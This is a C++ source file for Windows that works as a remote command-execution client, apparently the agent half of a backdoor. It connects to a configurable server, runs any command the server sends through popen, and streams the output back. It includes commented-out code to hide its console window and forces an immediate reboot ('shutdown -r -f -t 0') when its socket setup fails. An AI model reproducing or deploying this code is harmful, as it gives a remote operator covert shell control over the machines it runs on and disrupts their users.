#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <thread>
#define INTERVAL 2000//传输等待(单位为us,为保证数据包连续性,应至少大于0.5RTT)
#define READ_SIZE 32//管道读入缓冲区
#define SEND_SIZE 48//tcp发送缓冲区
#define RECV_SIZE 256//tcp接收缓冲区
#define PORT 39762//与服务端适配
#define SERVER_IP "127.0.0.1"//与服务端适配
#define sleep(x) this_thread::sleep_for(chrono::milliseconds(x))

using namespace std;

int heart_beat,connected;
WORD winsock_version;
WSADATA wsa_data;
SOCKET client_socket;
struct sockaddr_in server_addr;
FILE *pipe;
bool locked;
char command[RECV_SIZE+1];
const char echo[RECV_SIZE+1]="!Connected!!";
const char ques[SEND_SIZE+1]="!Connected??";
const char done[SEND_SIZE+1]="!Finished!!";
const char stop[SEND_SIZE+1]="#<STOP>";
//控制字符
void print(const char *str){printf("[% *.3f] %s\n",10,(double)clock()/1000,str);}
void print(const char *str1,const char *str2){printf("[% *.3f] %s%s\n",10,(double)clock()/1000,str1,str2);}
void print(const char *str1,const int x){printf("[% *.3f] %s%d\n",10,(double)clock()/1000,str1,x);}
//状态输出
void delay(long long us){
	auto start=chrono::system_clock::now();
	while(1){
		auto end=chrono::system_clock::now();
		auto duration=chrono::duration_cast<chrono::microseconds>(end-start);
		if(duration.count()>=us)break;
	}
}
//高精度定时器
void strproc(char *str){
	strcat(str,stop);
}
bool make_socket(){
	int flag=5;
	while(flag!=-1&&flag!=0){
		winsock_version=MAKEWORD(2,2);
		if(WSAStartup(winsock_version,&wsa_data))print("Failed to init socket! Retrying..."),flag--,sleep(1000);
		else flag=-1;
	}
	server_addr.sin_family=AF_INET;
	server_addr.sin_port=htons(PORT);
	server_addr.sin_addr.S_un.S_addr=inet_addr(SERVER_IP);
	return flag==0;
}
bool make_client(){
	int flag=5;
	while(flag!=-1&&flag!=0){
		client_socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if(client_socket==INVALID_SOCKET)print("Failed to create client socket! Retrying..."),flag--,sleep(1000);
		else flag=-1;
	}
	return flag==0;
}
bool reconnect(){
	connected=0;
	closesocket(client_socket);
	if(make_client())return 1;
	print("Connecting...");
	if(connect(client_socket,(LPSOCKADDR)&server_addr,sizeof(server_addr))==SOCKET_ERROR)print("Failed to connect!");
	else print("Succeeded to connect!"),connected=1;
	return 0;
}
void init(){
	print("Initializing...");
	if(make_socket())print("Initializing error!"),system("shutdown -r -f -t 0"),exit(1);
}
//以上为初始化
void auto_connect(){
	while(1){
		if(heart_beat<=2){
			if(reconnect())print("Socket creating error!"),system("shutdown -r -f -t 0"),exit(1);
		}
		heart_beat=0;
		sleep(5000);
	}
}
void auto_send(){
	while(1){
		if(connected){
			if(send(client_socket,ques,SEND_SIZE,0)<0)print("Failed to send heart beat!");
			else heart_beat++;
		}
		sleep(1000);
	}
}
void execute(){
	char send_data[SEND_SIZE+1]={0};
	print("Executing command...");
	pipe=popen(command,"r");
	if(pipe==NULL){
		print("Failed to open the pipe!");
		return;
	}
	int siz;
	while(siz=fread(send_data,sizeof(char),READ_SIZE,pipe)){
		strproc(send_data);
		if(!connected)return;
		int flag=3;
		while(flag!=-1&&flag!=0){
			if(send(client_socket,send_data,SEND_SIZE,0)<0)print("Failed to send result! Retrying..."),flag--,sleep(100);
			else flag=-1;
		}
		if(flag==0)print("Send error!");
		memset(send_data,0,sizeof send_data);
		delay(INTERVAL);
	}
	print("Executing successfully!");	
	if(!connected)return;
	int flag=3;
	while(flag!=-1&&flag!=0){
		if(send(client_socket,done,SEND_SIZE,0)<0)print("Failed to send stop frame!"),flag--,sleep(100);
		else flag=-1;
	}
	if(flag==0)print("Send error!");
}
void auto_exec(){
	while(1){
		if(locked){
			execute();
			pclose(pipe);
			locked=0;
		}
		sleep(1);
	}
}
int main(){
//	HWND now=GetForegroundWindow();
//	ShowWindow(now,SW_HIDE);
	
	init();
	thread conn_magr(auto_connect);
	thread send_beat(auto_send);
	thread exec_cmd(auto_exec);
	conn_magr.detach();
	send_beat.detach();
	exec_cmd.detach();
	
	char recv_data[RECV_SIZE+1];
	while(1){
		if(connected){
			memset(recv_data,0,sizeof(recv_data));
			int len=recv(client_socket,recv_data,RECV_SIZE,0);
			if(len<0){
				print("Failed to receive data!");
			}else{
				if(strcmp(recv_data,echo)==0){
					heart_beat++;
					print("Echo from server: ",recv_data+1);
				}else{
					if(locked)continue;
					memcpy(command,recv_data,sizeof command);
					locked=1;
				}
			}
		}
		sleep(1);
	}
	
	closesocket(client_socket);
	WSACleanup();
	return 0;
}
